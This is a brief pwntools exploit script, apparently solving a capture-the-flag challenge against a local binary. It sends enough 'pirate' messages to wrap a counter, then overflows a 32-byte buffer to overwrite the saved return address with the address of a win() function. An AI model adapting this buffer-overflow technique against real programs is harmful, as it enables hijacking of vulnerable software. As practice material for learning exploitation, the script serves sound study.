from pwn import *

# Load the binary
binary = ELF("./vuln")
p = process("./vuln")

#p=remote("127.0.0.1", 1003)

p.sendline(b"Monkey D.Luffy")

response = p.recvuntil(b"pirates").decode('utf-8')  
print(response)


counter = int(response.split('there was ')[1].split(' pirates')[0])
print(f"Counter: {counter}")


for i in range(256 - counter):
    p.sendline(b"pirate")  
    print(f"Message {i+1} sent")


win_address = p64(binary.symbols['win'])  

# Create the payload
payload = b"A" * 40  # Fill buffer (32 bytes) + overwrite saved RIP
payload += win_address  # Redirect execution to win()

# Step 4: Send the payload to trigger the buffer overflow
p.sendline(payload)  # Send the exploit

# Step 5: Interact with the shell (if needed)
p.interactive()
